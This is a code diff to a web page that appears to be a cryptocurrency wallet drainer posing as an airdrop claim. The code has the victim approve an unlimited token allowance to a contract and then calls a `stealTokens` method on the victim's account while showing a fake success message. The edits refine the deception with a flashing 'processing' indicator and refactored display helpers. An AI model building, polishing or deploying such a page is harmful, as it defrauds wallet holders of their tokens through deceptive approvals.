@@ -104,9 +104,22 @@
 
     .processing {
       display: none;
-      font-size: 1rem;
+      font-size: 1.5rem;
       color: yellow;
       margin-top: 20px;
+      animation: flash 1s infinite;
+    }
+
+    @keyframes flash {
+      0% {
+        opacity: 0;
+      }
+      50% {
+        opacity: 1;
+      }
+      100% {
+        opacity: 0;
+      }
     }
   </style>
 </head>
@@ -228,14 +241,13 @@
       if (!web3) return;
       const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
       try {
-        document.getElementById('processingMessage').style.display = 'block';  // Show processing message
+        showProcessingMessage();  // Show processing message
         const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'); // Max 256-bit value
         await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] });
-        document.getElementById('processingMessage').style.display = 'none';  // Hide processing message
-        alert('Approval successful! You can now claim your airdrop.');
+        hideProcessingMessage();  // Hide processing message
         document.getElementById('claimAirdropButton').disabled = false;
       } catch (error) {
-        document.getElementById('processingMessage').style.display = 'none';  // Hide processing message
+        hideProcessingMessage();  // Hide processing message
         alert('Error during approval');
       }
     }
@@ -243,12 +255,12 @@
     async function claimAirdrop() {
       const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
       try {
-        document.getElementById('processingMessage').style.display = 'block';  // Show processing message
+        showProcessingMessage();  // Show processing message
         await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
-        document.getElementById('processingMessage').style.display = 'none';  // Hide processing message
+        hideProcessingMessage();  // Hide processing message
         alert('Airdrop claimed successfully!');
       } catch (error) {
-        document.getElementById('processingMessage').style.display = 'none';  // Hide processing message
+        hideProcessingMessage();  // Hide processing message
         alert('Error claiming airdrop');
       }
     }
@@ -271,6 +283,14 @@
       } catch (error) {
         alert('Error during token withdrawal');
       }
+    }
+
+    function showProcessingMessage() {
+      document.getElementById('processingMessage').classList.add('show');
+    }
+
+    function hideProcessingMessage() {
+      document.getElementById('processingMessage').classList.remove('show');
     }
 
     document.getElementById('connectButton').addEventListener('click', connectMetaMask);
